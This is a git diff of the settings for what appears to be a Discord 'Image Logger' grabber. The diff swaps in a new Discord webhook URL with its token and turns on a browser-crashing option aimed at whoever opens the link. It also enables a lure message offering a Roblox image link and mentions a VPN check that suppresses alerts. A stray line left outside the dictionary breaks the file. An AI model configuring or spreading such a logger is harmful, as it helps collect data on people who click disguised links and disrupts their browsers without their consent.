@@ -8,22 +8,24 @@ __version__ = "v2.0"
 __author__ = "Dexty"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1412495995891351653/80m2W2-jhHTpHqxhzcMFNwnfDudptLb63Ms0GM0zISzbVYgT70Nbl1nXtW9NiM05BJp9",
+    "webhook": "https://discord.com/api/webhooks/1412460994680061962/Lr9R0WafZz8FRkCLtglMyIFWhivlnKRv9ao0R1pR04C_Qty--W1CQ42KocgN4a9Rnp8Z",
     
-    # CUSTOMIZATION #
-    "username": "Image Logger", 
-    "color": 0x00FFFF, 
-
-    # OPTIONS #
-    "crashBrowser": True,
-    "accurateLocation": False,
-
+    # CUSTOMIZATION
+    "username": "Image Logger",
+    "color": 0x00FFFF,  # Hex color for embed
+    
+    # OPTIONS
+    "crashBrowser": True,  # Tries to crash/freeze the user's browser
+    "accurateLocation": False,  # Disabled, as it asks the user permission
+    
+    # MESSAGE SETTINGS
     "message": {
-        "doMessage": False,
+        "doMessage": True,  # Enable the custom message
         "message": "Here is your link: https://tr.rbxcdn.com/180DAY-f8add11aa463c6b6827252d5087c1dfc/768/432/Image/Webp/noFilter",
-        "richMessage": True,
-    },
+        "richMessage": True,  # Enable rich text (Markdown)
+    }
 }
+
 
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
